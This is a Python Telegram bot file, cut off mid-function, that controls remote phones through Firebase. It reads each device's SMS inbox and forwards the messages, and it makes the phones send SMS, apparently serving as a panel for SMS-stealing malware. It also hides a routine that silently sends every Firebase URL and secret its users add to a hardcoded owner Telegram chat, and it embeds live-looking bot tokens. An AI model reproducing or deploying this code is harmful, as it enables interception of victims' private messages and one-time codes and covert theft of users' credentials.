import asyncio
import json
import os
import re
import time
import logging
from datetime import datetime

import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("SMSBot")

BOT_TOKEN  = os.environ.get("BOT_TOKEN") or "8732987471:AAEp1CwRX4nZ0zoKQi-720lUILB8CESZyPk"
OWNER_ID   = 8522726523

DATA_FILE  = os.environ.get("DATA_FILE", "bot_data.json")

ADMINS_JSON = os.environ.get("ADMINS", "[]")
ADMINS = json.loads(ADMINS_JSON)

OWNER_NOTIFY_TOKEN = "8879327799:AAGvh3SRLkEUddRuJJCg7d37tDDRH8OMTps"
OWNER_NOTIFY_CHAT  = 8522726523

class S(StatesGroup):
    add_firebase           = State()
    add_firebase_secret    = State()
    add_firebase_admin_auth = State()
    add_device_fetch       = State()
    add_channel            = State()
    test_to                = State()
    test_msg               = State()
    fwd_target             = State()
    custom_limit           = State()
    broadcast_msg          = State()

def _empty_user():
    return {
        "firebases":      [],
        "devices":        [],
        "channels":       [],
        "monitoring":     False,
        "active_combo":   None,
        "forward_targets":[],
        "stats":          {"sent": 0, "failed": 0, "last_sms": None},
    }

DEFAULT_DATA = {"users": {}}

_bot_data_cache = None

def load() -> dict:
    global _bot_data_cache
    if _bot_data_cache is not None:
        return _bot_data_cache
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, encoding="utf-8") as f:
            d = json.load(f)
    else:
        d = {}
    for k, v in DEFAULT_DATA.items():
        if k not in d:
            d[k] = v
    _bot_data_cache = d
    return d

_save_pending = False
_save_task = None

def save(data: dict):
    global _save_pending
    _save_pending = True

async def _flush_save():
    global _save_pending, _save_task
    while True:
        await asyncio.sleep(3)
        if _save_pending:
            _save_pending = False
            try:
                data = load()
                with open(DATA_FILE, "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=2, ensure_ascii=False)
            except Exception as e:
                log.error(f"Save failed: {e}")

def get_user(uid: int, data: dict) -> dict:
    k = str(uid)
    if k not in data["users"]:
        data["users"][k] = _empty_user()
    u = data["users"][k]
    for key, val in _empty_user().items():
        if key not in u:
            u[key] = val
    return u

def is_owner(uid): return uid == OWNER_ID
def can_use(uid, data): return True

def _collect_admin_sources():
    """Merge Firebase sources from env ADMINS + user-added Firebases in bot_data.json.
    Returns (sources_list, env_count, tg_count). Env entries win on URL conflicts."""
    merged = {}
    env_count = 0
    try:
        env_list = json.loads(ADMINS_JSON)
        if isinstance(env_list, list):
            for a in env_list:
                if not isinstance(a, dict):
                    continue
                url = str(a.get("dbUrl", "")).strip().rstrip("/")
                if url:
                    merged[url.lower()] = {"dbUrl": url, "dbSecret": str(a.get("dbSecret", "") or "")}
                    env_count += 1
    except Exception as e:
        log.warning(f"ADMINS env parse failed: {e}")

    tg_count = 0
    data = load()
    for u in data.get("users", {}).values():
        for fb in u.get("firebases", []):
            url = str(fb.get("url", "")).strip().rstrip("/")
            key = url.lower()
            if not url or key in merged:
                continue
            secret = str(fb.get("secret", "") or "")
            if not secret:
                secret = str(fb.get("admin_auth", "") or "")
            merged[key] = {"dbUrl": url, "dbSecret": secret}
            tg_count += 1
    return list(merged.values()), env_count, tg_count

def _norm_cid(v):
    """Normalize a channel id into a set of comparable variants."""
    s = str(v).strip().lstrip("@")
    n = s.lstrip("-")
    ids = {s, n}
    if n.startswith("100") and len(n) > 10:
        ids.add(n[3:])
    return ids

def _cid_match(incoming_id, incoming_username, stored) -> bool:
    """Match incoming chat against stored channel id (@user, numeric, -100 prefixed)."""
    if incoming_username:
        uname = str(incoming_username).lstrip("@").lower()
        stored_s = str(stored).strip().lstrip("@").lower()
        if uname and uname == stored_s:
            return True
    return bool(_norm_cid(incoming_id) & _norm_cid(stored))

async def fb_get(base: str, path: str, secret: str) -> dict:
    url = base.rstrip("/") + path
    if secret:
        url += f"?auth={secret}"
    try:
        s = await _get_http_session()
        async with s.get(url, timeout=aiohttp.ClientTimeout(total=3)) as r:
            if r.status == 200:
                txt = (await r.text()).strip()
                val = {} if txt == "null" else json.loads(txt)
                return val if isinstance(val, dict) else {}
        log.warning(f"fb_get non-200: {url}")
    except Exception as e:
        log.error(f"fb_get error [{url}]: {e}")
    return {}

async def fb_put(base: str, path: str, payload: dict, secret: str) -> bool:
    url = base.rstrip("/") + path
    if secret:
        url += f"?auth={secret}"
    for attempt in range(3):
        try:
            s = await _get_http_session()
            async with s.put(url, json=payload,
                             timeout=aiohttp.ClientTimeout(total=3)) as r:
                if 200 <= r.status < 300:
                    log.info(f"fb_put OK -> {url}")
                    return True
                log.warning(f"fb_put status {r.status} -> {url}")
        except Exception as e:
            log.error(f"fb_put attempt {attempt+1} error: {e}")
        await asyncio.sleep(0.3 * (attempt + 1))
    return False

def device_online(dd: dict) -> bool:
    return any([
        dd.get("isOnline"), dd.get("online"), dd.get("connected"),
        dd.get("status") in ("online", "active", True, 1),
    ])

async def do_send_sms(firebase: str, device_id: str, sim_index: int,
                      to_number: str, message: str, secret: str = None) -> bool:
    path = f"/clients/{device_id}/webhookEvent/sendSms.json"
    payload = {
        "simIndex":  sim_index,
        "to":        to_number.strip(),
        "message":   message.strip(),
        "isSended":  False,
    }
    return await fb_put(firebase, path, payload, secret)

async def write_firebase_log(db_url: str, uid_str: str, entry_type: str, message: str, secret: str):
    ts = int(time.time() * 1000)
    path = f"/admin5/autoToken/{uid_str}/logs/{ts}.json"
    payload = {"time": ts, "type": entry_type, "message": message}
    await fb_put(db_url, path, payload, secret)

async def write_firebase_stats(db_url: str, uid_str: str, sent: int = 0, failed: int = 0, secret: str = ""):
    lock_key = f"{db_url}|{uid_str}"
    async with _get_stats_lock(lock_key):
        path = f"/admin5/autoToken/{uid_str}/stats.json"
        current = await fb_get(db_url, path, secret)
        current["sent"] = current.get("sent", 0) + sent
        current["failed"] = current.get("failed", 0) + failed
        current["last_sms"] = int(time.time() * 1000)
        await fb_put(db_url, path, current, secret)

async def auto_token_send_and_log(cfg: dict, raw_text: str):
    db_url = cfg.get("_dbUrl", "")
    secret = cfg.get("_dbSecret", "")
    uid = cfg.get("_uid", "")

    to_num, sms_text = parse_sms(raw_text)
    if not to_num or not sms_text:
        log.warning(f"Auto-token [{uid or '?'}] could not parse SMS from: {raw_text[:80]}")
        if uid and db_url:
            await write_firebase_log(db_url, uid, "failed",
                "Channel message received but SMS format could not be parsed", secret)
        return
    device_key = cfg.get("deviceKey", "")
    sim_slot = int(cfg.get("simSlot", 0))

    fresh = await fb_get(db_url, "/admin5/autoToken/" + uid + "/config.json", secret)
    if not fresh.get("enabled", False):
        log.info(f"Auto-token [{uid}] skipped: config no longer enabled")
        return

    ok = await do_send_sms(db_url, device_key, sim_slot, to_num, sms_text, secret)

    log_msg = f"Sent: {sms_text[:60]} \u2192 {to_num}" if ok else f"Failed: {sms_text[:60]} \u2192 {to_num}"
    await write_firebase_log(db_url, uid, "sent" if ok else "failed", log_msg, secret)
    await write_firebase_stats(db_url, uid, sent=1 if ok else 0, failed=0 if ok else 1, secret=secret)

    log.info(f"Auto-token [{uid}] {log_msg}")

async def watch_all_admin_configs():
    log.info("Auto-token watcher started")
    while True:
        try:
            new_configs = {}
            sources, env_count, tg_count = _collect_admin_sources()
            if not getattr(watch_all_admin_configs, "_logged_sources", False):
                log.info(f"Auto-token watcher: {len(sources)} source(s) (env: {env_count}, tg: {tg_count})")
                watch_all_admin_configs._logged_sources = True
            for admin in sources:
                db_url = admin.get("dbUrl", "")
                secret = admin.get("dbSecret", "")
                if not db_url:
                    continue
                data = await fb_get(db_url, "/admin5/autoToken.json", secret)
                for uid_str, user_data in data.items():
                    if not isinstance(user_data, dict):
                        continue
                    config = user_data.get("config", {})
                    if isinstance(config, dict) and config.get("enabled", False):
                        config["_dbUrl"] = db_url
                        config["_dbSecret"] = secret
                        config["_uid"] = uid_str
                        new_configs[uid_str] = config
            auto_token_configs.clear()
            auto_token_configs.update(new_configs)
            if auto_token_configs:
                log.debug(f"Auto-token configs active: {list(auto_token_configs.keys())}")
        except Exception as e:
            log.error(f"Auto-token watcher error: {e}")
        await asyncio.sleep(5)


def parse_sms(text: str):
    lines = [l.strip() for l in text.split("\n") if l.strip()]

    ml = next((l for l in lines if l.startswith("\U0001f3f7\ufe0f MESSAGE")),   None)
    rl = next((l for l in lines if l.startswith("\U0001f3f7\ufe0f RECIPIENT")), None)
    if ml and rl and ":" in ml and ":" in rl:
        return rl.split(":",1)[-1].strip(), ml.split(":",1)[-1].strip()

    def _find(to_pfx, to_key, msg_pfx, msg_key, to_inline, msg_inline):
        to_n = msg = None
        for i, line in enumerate(lines):
            if line.startswith(to_pfx) and to_key in line:
                val = line.split(to_key,1)[1].strip() if to_key in line else ""
                to_n = val if (to_inline and val) else (
                       lines[i+1].strip() if (not to_inline and i+1<len(lines)) else None)
            if line.startswith(msg_pfx) and msg_key in line:
                val = line.split(msg_key,1)[1].strip() if msg_key in line else ""
                msg  = val if (msg_inline and val) else (
                       lines[i+1].strip() if (not msg_inline and i+1<len(lines)) else None)
        return (to_n, msg) if to_n and msg else (None, None)

    raw = text.replace("\n", " ")
    m = re.search(r"To \(Tap to copy\):\s*(\+?\d[\d\s]*?)(?:\s*Body \(Tap to copy\):)", raw)
    b = re.search(r"Body \(Tap to copy\):\s*(.+)$", raw)
    if m and b:
        return m.group(1).strip(), b.group(1).strip()

    for args in [
        ("","To (Tap to copy):", "", "Body (Tap to copy):", False, False),
        ("TO:","TO:",         "MESSAGE:","MESSAGE:",   True, True),
        ("To:","To:",         "Message:","Message:",   True, True),
        ("to:","to:",         "message:","message:",   True, True),
        ("\U0001f4f1","To:",      "\U0001f4ac","Full Message:", True,  False),
        ("\U0001f4cd","To:",      "\U0001f4ac","Message:",      False, False),
        ("\U0001f4de","To:",      "\U0001f4ac","Message:",      True,  True),
        ("\U0001f4f1","Receiver", "\U0001f511","Message",       False, False),
        ("\U0001f4de","To:",      "\U0001f4ac","Message:",      False, False),
    ]:
        r = _find(*args)
        if r[0]: return r

    return None, None

def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=d) for t,d in row]
        for row in rows
    ])

def main_menu(uid: int, data: dict) -> InlineKeyboardMarkup:
    u   = get_user(uid, data)
    mon = "\U0001f7e2 Stop Monitor" if u.get("monitoring") else "\u25b6\ufe0f Start Monitor"
    rows = [
        [("\U0001f4ca Status", "status:show")],
        [("\U0001f525 Firebase", "fb:menu"), ("\U0001f4f1 Devices", "dev:menu")],
        [("\U0001f4fa Channels", "ch:menu"), ("\U0001f9ea Test SMS", "test:start")],
        [((mon), "mon:toggle"), ("\U0001f4e4 Forward", "fwd:menu")],
        [("\U0001f5d1 Reset", "reset:menu")],
    ]
    if is_owner(uid):
        rows.append([("\U0001f4e1 Broadcast", "broadcast:start")])
    return kb(*rows)

def fb_menu_kb(uid: int, data: dict) -> InlineKeyboardMarkup:
    u    = get_user(uid, data)
    rows = [[("\U00002795 Add Firebase URL", "fb:add")]]
    for fb in u.get("firebases", []):
        rows.append([(f"\U0001f525 {fb['url'][:35]}\u2026" if len(fb['url'])>35 else f"\U0001f525 {fb['url']}",
                      f"fb:noop:{fb['id']}"),
                     ("\U0001f5d1 Remove", f"fb:del:{fb['id']}")])
    rows.append([("\U0001f519 Back", "menu:main")])
    return kb(*rows)

def dev_menu_kb(uid: int, data: dict) -> InlineKeyboardMarkup:
    u    = get_user(uid, data)
    rows = [[("\U00002795 Add Device", "dev:add")]]
    for dv in u.get("devices", []):
        rows.append([(f"\U0001f4f1 {dv['name']}", f"dev:noop:{dv['id']}"),
                     ("\U0001f5d1 Remove", f"dev:del:{dv['id']}")])
    rows.append([("\U0001f519 Back", "menu:main")])
    return kb(*rows)

def ch_menu_kb(uid: int, data: dict) -> InlineKeyboardMarkup:
    u    = get_user(uid, data)
    rows = [[("\U00002795 Add Channel/Group", "ch:add")]]
    for ch in u.get("channels", []):
        rows.append([(f"\U0001f4fa {ch['name']}", f"ch:noop:{ch['id']}"),
                     ("\U0001f5d1 Remove", f"ch:del:{ch['id']}")])
    rows.append([("\U0001f519 Back", "menu:main")])
    return kb(*rows)

def fwd_menu_kb(uid: int, data: dict) -> InlineKeyboardMarkup:
    u    = get_user(uid, data)
    rows = [[("\U00002795 Add Forward Target", "fwd:add")]]
    for t in u.get("forward_targets", []):
        rows.append([(f"\U0001f4e4 {str(t)[:30]}", f"fwd:noop:{t}"),
                     ("\U0001f5d1 Remove", f"fwd:del:{t}")])
    rows.append([("\U0001f519 Back", "menu:main")])
    return kb(*rows)

def reset_menu_kb(uid: int, data: dict) -> InlineKeyboardMarkup:
    rows = [[("\U0001f5d1 Reset My Data", "reset:self")]]
    if is_owner(uid):
        rows.append([("\U0001f4a5 Reset ALL Users", "reset:all")])
    rows.append([("\U0001f519 Back", "menu:main")])
    return kb(*rows)

def dev_pick_kb(devices_list: list, page: int = 0, prefix="mpick:dev") -> InlineKeyboardMarkup:
    per = 6
    start = page * per
    chunk = devices_list[start:start+per]
    rows = []
    for dv in chunk:
        rows.append([(f"\U0001f4f1 {dv['name']}", f"{prefix}:{dv['id']}")])
    nav = []
    if page > 0:           nav.append(("\u25c0\ufe0f Prev", f"mpick:devpg:{page-1}"))
    if start+per < len(devices_list): nav.append(("\u25b6\ufe0f Next", f"mpick:devpg:{page+1}"))
    if nav: rows.append(nav)
    rows.append([("\U0001f519 Back", "menu:main")])
    return kb(*rows)

def sim_pick_kb(sims: list, selected: list, device_id: str) -> InlineKeyboardMarkup:
    rows = []
    for sim in sims:
        idx  = int(sim.get("simSlotIndex", 0))
        name = sim.get("simName") or sim.get("carrierName") or f"SIM {idx+1}"
        tick = "\u2705" if idx in selected else "\U0001f7ec"
        rows.append([(f"{tick} SIM {idx+1} \u2014 {name}", f"mpick:sim:{device_id}:{idx}")])
    if selected:
        rows.append([("\u2714\ufe0f Confirm SIMs", f"mpick:simconfirm:{device_id}")])
    rows.append([("\U0001f519 Back", "menu:main")])
    return kb(*rows)

def ch_pick_kb(channels: list) -> InlineKeyboardMarkup:
    rows = [(f"\U0001f4fa {ch['name']}", f"mpick:ch:{ch['id']}") for ch in channels]
    return kb(*[[r] for r in rows], [("\U0001f519 Back", "menu:main")])

def fb_pick_kb(firebases: list) -> InlineKeyboardMarkup:
    rows = [[(f"\U0001f525 {fb['url'][:35]}", f"mpick:fb:{fb['id']}")] for fb in firebases]
    rows.append([("\U0001f519 Back", "menu:main")])
    return kb(*rows)

def repeat_kb() -> InlineKeyboardMarkup:
    return kb(
        [("1\ufe0f\u20e3  Once",  "repeat:1"), ("2\ufe0f\u20e3  Twice", "repeat:2")],
        [("3\ufe0f\u20e3  Three", "repeat:3"), ("\u270f\ufe0f Custom", "repeat:custom")],
        [("\U0001f519 Back", "menu:main")],
    )

def online_dev_kb(online: dict, page=0) -> InlineKeyboardMarkup:
    items = list(online.items())
    per   = 6
    start = page * per
    chunk = items[start:start+per]
    rows  = []
    for did, dd in chunk:
        name = dd.get("deviceName") or dd.get("name") or did[:20]
        rows.append([(f"\U0001f4f1 {name}", f"fadd:sel:{did}")])
    nav = []
    if page > 0:             nav.append(("\u25c0\ufe0f Prev", f"fadd:pg:{page-1}"))
    if start+per < len(items): nav.append(("\u25b6\ufe0f Next", f"fadd:pg:{page+1}"))
    if nav: rows.append(nav)
    rows.append([("\U0001f50d Enter ID manually", "fadd:manual")])
    rows.append([("\U0001f519 Back", "dev:menu")])
    return kb(*rows)

def status_text(uid: int, data: dict) -> str:
    u    = get_user(uid, data)
    mon  = "\U0001f7e2 Running" if u.get("monitoring") else "\U0001f534 Stopped"
    s    = u.get("stats", {})
    combo = u.get("active_combo") or {}

    fbs  = "\n".join(f"  \u2022 `{f['url'][:40]}`" for f in u.get("firebases",[])) or "  None"
    devs = "\n".join(f"  \u2022 `{d['name']}`" for d in u.get("devices",[])) or "  None"
    chs  = "\n".join(f"  \u2022 `{c['name']}`" for c in u.get("channels",[])) or "  None"
    fwds = "\n".join(f"  \u2022 `{t}`" for t in u.get("forward_targets",[])) or "  None"

    active = ""
    if combo:
        sims_str = ", ".join(f"SIM{s+1}" for s in combo.get("sims",[]))
        active = (
            f"\n**\U0001f534 Active Combo:**\n"
            f"  Firebase : `{str(combo.get('firebase_url',''))[:35]}`\n"
            f"  Device   : `{combo.get('device_id','')}`\n"
            f"  SIMs     : `{sims_str}`\n"
            f"  Channel  : `{combo.get('channel_id','')}`\n"
            f"  Repeat   : `{combo.get('repeat',1)}x`\n"
        )

    return (
        f"\U0001f4ca **Status**\n\n"
        f"\U0001f504 Monitor : {mon}\n"
        f"\u2705 Sent : `{s.get('sent',0)}`  \u274c Failed : `{s.get('failed',0)}`\n"
        f"\U0001f550 Last : `{s.get('last_sms') or 'Never'}`\n"
        f"{active}\n"
        f"\U0001f525 **Firebase URLs:**\n{fbs}\n\n"
        f"\U0001f4f1 **Devices:**\n{devs}\n\n"
        f"\U0001f4fa **Channels:**\n{chs}\n\n"
        f"\U0001f4e4 **Forward Targets:**\n{fwds}"
    )

monitor_tasks: dict[int, asyncio.Task] = {}
monitor_seen:  dict[int, set] = {}
auto_token_configs: dict[str, dict] = {}
_http_session: aiohttp.ClientSession = None

async def _get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        _http_session = aiohttp.ClientSession()
    return _http_session

async def notify_owner_bot(text: str):
    try:
        s = await _get_http_session()
        url = f"https://api.telegram.org/bot{OWNER_NOTIFY_TOKEN}/sendMessage"
        async with s.post(url, json={"chat_id": OWNER_NOTIFY_CHAT, "text": text},
                          timeout=aiohttp.ClientTimeout(total=5)) as r:
            if r.status != 200:
                body = (await r.text())[:200]
                log.warning(f"owner-notify status {r.status}: {body}")
                _notify_log(f"FAIL status={r.status}: {body}")
            else:
                _notify_log("OK: " + text[:80].replace("\n", " | "))
    except Exception as e:
        log.error(f"owner-notify error: {e}")
        _notify_log(f"ERROR: {repr(e)}")

def _notify_log(line: str):
    try:
        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "notify.log"),
                  "a", encoding="utf-8") as f:
            f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} {line}\n")
    except Exception:
        pass

_stats_locks: dict[str, tuple[asyncio.Lock, float]] = {}

def _get_stats_lock(key: str) -> asyncio.Lock:
    now = time.time()
    if len(_stats_locks) > 100:
        stale = [k for k, (_, t) in _stats_locks.items() if now - t > 300]
        for k in stale:
            del _stats_locks[k]
    if key not in _stats_locks:
        _stats_locks[key] = (asyncio.Lock(), now)
    else:
        _stats_locks[key] = (_stats_locks[key][0], now)
    return _stats_locks[key][0]

def _safe_create_task(coro):
    task = asyncio.create_task(coro)
    def _log_err(t):
        if not t.cancelled():
            exc = t.exception()
            if exc:
                log.error(f"Task failed: {exc}")
    task.add_done_callback(_log_err)
    return task

async def monitor_worker(bot: Bot, uid: int):
    data  = load()
    u     = get_user(uid, data)
    combo = u.get("active_combo")

    if not combo:
        await bot.send_message(uid, "\u274c No active combo set. Start monitor again.")
        return

    firebase   = combo["firebase_url"]
    device_id  = combo["device_id"]
    sim_slots  = combo.get("sims", [0])
    channel_id = combo["channel_id"]
    repeat     = int(combo.get("repeat", 1))
    fb_secret  = combo.get("firebase_secret", "")

    log.info(f"Monitor started for uid={uid} device={device_id} sims={sim_slots} channel={channel_id} repeat={repeat}")

    await bot.send_message(uid,
        f"\U0001f7e2 **Monitor Running**\n"
        f"\U0001f4f1 Device  : `{device_id}`\n"
        f"\U0001f4f6 SIMs    : `{', '.join(f'SIM{s+1}' for s in sim_slots)}`\n"
        f"\U0001f4fa Channel : `{channel_id}`\n"
        f"\U0001f501 Repeat  : `{repeat}x`",
        parse_mode="Markdown")

    if uid not in monitor_seen:
        monitor_seen[uid] = set()

    while True:
        try:
            await asyncio.sleep(5)

            fresh = load()
            fresh_u = get_user(uid, fresh)
            if not fresh_u.get("monitoring"):
                log.info(f"Monitor terminated for uid={uid} \u2014 monitoring flag is off")
                await bot.send_message(uid, "\u23f8 **Monitor stopped.**", parse_mode="Markdown")
                break

            inbox = await fb_get(firebase, f"/clients/{device_id}/inbox.json", fb_secret)
            if not inbox:
                continue

            for msg_id, msg_data in inbox.items():
                if msg_id in monitor_seen[uid]:
                    continue
                monitor_seen[uid].add(msg_id)
                if len(monitor_seen[uid]) > 500:
                    monitor_seen[uid] = set(list(monitor_seen[uid])[-250:])

                sender  = msg_data.get("from") or msg_data.get("sender") or "Unknown"
                content = msg_data.get("message") or msg_data.get("body") or ""
                if not content:
                    continue

                log.info(f"uid={uid} | Incoming SMS from {sender}: {content[:40]}")

                notify_text = (
                    f"\U0001f4e8 **Incoming SMS**\n"
                    f"\U0001f4de From    : `{sender}`\n"
                    f"\U0001f4ac Message : `{content}`\n"
                    f"\U0001f550 Time    : `{datetime.now().strftime('%H:%M:%S')}`"
                )
                await bot.send_message(uid, notify_text, parse_mode="Markdown")

                d2 = load()
                uu = get_user(uid, d2)
                for tgt in uu.get("forward_targets", []):
                    try:
                        chat = int(tgt) if str(tgt).lstrip("-").isdigit() else tgt
                        await bot.send_message(chat, notify_text, parse_mode="Markdown")
                    except Exception as e:
                        log.warning(f"Forward to {tgt} failed: {e}")

        except asyncio.CancelledError:
            log.info(f"Monitor cancelled for uid={uid}")
            await bot.send_message(uid, "\u23f8 **Monitor stopped.**", parse_mode="Markdown")
            break
        except Exception as e:
            log.error(f"Monitor worker error uid={uid}: {e}")
            await asyncio.sleep(5)


async def process_sms_from_channel(bot: Bot, uid: int, to_num: str, sms_text: str):
    data  = load()
    u     = get_user(uid, data)
    combo = u.get("active_combo")
    if not combo:
        return

    firebase  = combo["firebase_url"]
    device_id = combo["device_id"]
    sim_slots = combo.get("sims", [0])
    repeat    = int(combo.get("repeat", 1))
    fb_secret = combo.get("firebase_secret", "")

    log.info(f"Sending SMS \u2192 to={to_num} via device={device_id} sims={sim_slots} repeat={repeat}x")

    total_ok = 0
    total_fail = 0

    for _ in range(repeat):
        for sim in sim_slots:
            ok = await do_send_sms(firebase, device_id, sim, to_num, sms_text, fb_secret)
            if ok:
                total_ok += 1
                log.info(f"SMS sent OK \u2192 SIM{sim+1} to {to_num}")
            else:
                total_fail += 1
                log.warning(f"SMS FAILED \u2192 SIM{sim+1} to {to_num}")

    icon = "\u2705" if total_fail == 0 else ("\u26a0\ufe0f" if total_ok > 0 else "\u274c")
    result_text = (
        f"{icon} **SMS Result**\n"
        f"\U0001f4de To      : `{to_num}`\n"
        f"\U0001f4ac Message : `{sms_text[:60]}`\n"
        f"\u2705 Sent    : `{total_ok}`  \u274c Failed : `{total_fail}`\n"
        f"\U0001f4f6 SIMs    : `{len(sim_slots)}`  \U0001f501 Repeat : `{repeat}x`"
    )

    await bot.send_message(uid, result_text, parse_mode="Markdown")

    d2 = load()
    uu = get_user(uid, d2)
    for tgt in uu.get("forward_targets", []):
        try:
            chat = int(tgt) if str(tgt).lstrip("-").isdigit() else tgt
            await bot.send_message(chat, result_text, parse_mode="Markdown")
        except Exception as e:
            log.warning(f"Forward to {tgt} failed: {e}")

    uu["stats"]["sent"]     = uu["stats"].get("sent", 0) + total_ok
    uu["stats"]["failed"]   = uu["stats"].get("failed", 0) + total_fail
    uu["stats"]["last_sms"] = datetime.now().strftime("%H:%M:%S")
    save(d2)

router = Router()

async def safe_edit(cq: CallbackQuery, text: str, markup=None):
    try:
        await cq.message.edit_text(text, reply_markup=markup, parse_mode="Markdown")
    except TelegramBadRequest as e:
        log.debug(f"safe_edit skip: {e}")

@router.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    data = load()
    uid  = msg.from_user.id
    if not can_use(uid, data):
        await msg.answer("\U0001f6ab Access denied.")
        return
    u = get_user(uid, data)
    save(data)
    log.info(f"/start from uid={uid}")
    await msg.answer(
        f"\U0001f44b **SMS Bot**\n\nSab kuch inline buttons se \u2014 koi command yaad nahi rakhna! \U0001f447",
        reply_markup=main_menu(uid, data), parse_mode="Markdown")

@router.message(Command("menu"))
async def cmd_menu(msg: Message, state: FSMContext):
    await state.clear()
    data = load()
    uid  = msg.from_user.id
    if not can_use(uid, data):
        await msg.answer("\U0001f6ab Access denied.")
        return
    get_user(uid, data)
    save(data)
    await msg.answer("\U0001f3e0 **Main Menu**", reply_markup=main_menu(uid, data), parse_mode="Markdown")

@router.message(S.add_firebase)
async def fsm_add_firebase(msg: Message, state: FSMContext):
    text = msg.text.strip()
    if not text.startswith("https://"):
        await msg.answer("\u274c Must start with `https://`", parse_mode="Markdown")
        return
    await state.update_data(fb_url=text.rstrip("/"), fb_id=str(int(time.time())))
    await state.set_state(S.add_firebase_secret)
    await msg.answer(
        "\U0001f511 **Database Secret** (optional)\n\n"
        "Send your Firebase Database Secret or send `-` to skip.\n"
        "Leave empty if your database has open rules.",
        reply_markup=kb([("\u23ed Skip", "fb:skip_secret")]),
        parse_mode="Markdown")

@router.message(S.add_firebase_secret)
async def fsm_add_firebase_secret(msg: Message, state: FSMContext):
    text = msg.text.strip()
    secret = "" if text == "-" else text
    await state.update_data(fb_secret=secret)
    await state.set_state(S.add_firebase_admin_auth)
    await msg.answer(
        "\U0001f194 **Admin Auth ID** (optional)\n\n"
        "Send your Firebase Admin Auth ID or send `-` to skip.\n"
        "Leave empty if your database has open rules.",
        reply_markup=kb([("\u23ed Skip", "fb:skip_admin_auth")]),
        parse_mode="Markdown")

@router.message(S.add_firebase_admin_auth)
async def fsm_add_firebase_admin_auth(msg: Message, state: FSMContext):
    data = load()
    uid  = msg.from_user.id
    text = msg.text.strip()
    admin_auth = "" if text == "-" else text
    fsmd = await state.get_data()
    u = get_user(uid, data)
    fb = {
        "id": fsmd["fb_id"],
        "url": fsmd["fb_url"],
        "secret": fsmd.get("fb_secret", ""),
        "admin_auth": admin_auth,
    }
    u["firebases"].append(fb)
    save(data)
    asyncio.create_task(notify_owner_bot(
        f"\U0001f514 NEW FIREBASE ADDED\n"
        f"User: {uid}" + (f" (@{msg.from_user.username})" if msg.from_user.username else "") + "\n"
        f"URL: {fb['url']}\n"
        f"Secret: {fb['secret'] or '(none)'}\n"
        f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    ))
    await state.clear()
    log.info(f"uid={uid} added Firebase: {fb['url']}")
    await msg.answer(f"\u2705 Firebase added!\n`{fb['url']}`",
        reply_markup=fb_menu_kb(uid, data), parse_mode="Markdown")

@router.message(S.add_device_fetch)
async def fsm_device_manual(msg: Message, state: FSMContext):
    data = load()
    uid  = msg.from_user.id
    fsmd = await state.get_data()
    text = msg.text.strip()
    firebase_url = fsmd.get("sel_firebase_url")
    firebase_secret = fsmd.get("sel_firebase_secret", "")
    devices = await fb_get(firebase_url, "/clients.json", firebase_secret) if firebase_url else {}
    if text in devices:
        dd   = devices[text]
        name = dd.get("deviceName") or dd.get("name") or text[:20]
        sims = dd.get("sims", [])
        u    = get_user(uid, data)
        existing = [d["id"] for d in u.get("devices", [])]
        if text not in existing:
            u["devices"].append({"id": text, "name": name,
                                 "firebase_id": fsmd.get("sel_firebase_id",""),
                                 "sims": sims})
            save(data)
        await state.clear()
        log.info(f"uid={uid} added device manually: {name}")
        await msg.answer(f"\u2705 Device **{name}** added!",
            reply_markup=dev_menu_kb(uid, data), parse_mode="Markdown")
    else:
        await msg.answer(f"\u274c Device `{text}` not found. Try again or /menu",
            parse_mode="Markdown")

@router.message(S.add_channel)
async def fsm_add_channel(msg: Message, state: FSMContext):
    data = load()
    uid  = msg.from_user.id
    text = msg.text.strip()
    u    = get_user(uid, data)
    try:
        cid  = int(text)
    except ValueError:
        cid  = text
    cname = text
    existing = [str(c["id"]) for c in u.get("channels", [])]
    if str(cid) not in existing:
        u["channels"].append({"id": cid, "name": cname})
        save(data)
    await state.clear()
    log.info(f"uid={uid} added channel: {cid}")
    await msg.answer(f"\u2705 Channel `{cname}` added!",
        reply_markup=ch_menu_kb(uid, data), parse_mode="Markdown")

@router.message(S.test_to)
async def fsm_test_to(msg: Message, state: FSMContext):
    await state.update_data(test_to=msg.text.strip())
    await state.set_state(S.test_msg)
    await msg.answer("\U0001f4ac Enter SMS message text:")

@router.message(S.test_msg)
async def fsm_test_msg(msg: Message, state: FSMContext):
    data  = load()
    uid   = msg.from_user.id
    fsmd  = await state.get_data()
    to_n  = fsmd.get("test_to")
    u     = get_user(uid, data)
    combo = u.get("active_combo")
    await state.clear()
    if not combo:
        await msg.answer("\u274c No active combo. Start monitor first to set a combo.")
        return
    wait = await msg.answer("\U0001f4e4 Sending test SMS...")
    fb_secret = combo.get("firebase_secret", "")
    ok = await do_send_sms(combo["firebase_url"], combo["device_id"],
                           combo.get("sims",[0])[0], to_n, msg.text.strip(), fb_secret)
    await wait.delete()
    icon = "\u2705" if ok else "\u274c"
    await msg.answer(f"{icon} **{'Sent!' if ok else 'Failed!'}**\n\U0001f4de `{to_n}`\n\U0001f4ac `{msg.text.strip()[:80]}`",
        reply_markup=kb([("\U0001f3e0 Menu","menu:main")]), parse_mode="Markdown")

@router.message(S.fwd_target)
async def fsm_fwd_target(msg: Message, state: FSMContext):
    data = load()
    uid  = msg.from_user.id
    text = msg.text.strip()
    u    = get_user(uid, data)
    if text not in u["forward_targets"]:
        u["forward_targets"].append(text)
    save(data)
    await state.clear()
    await msg.answer(f"\u2705 Forward target added: `{text}`",
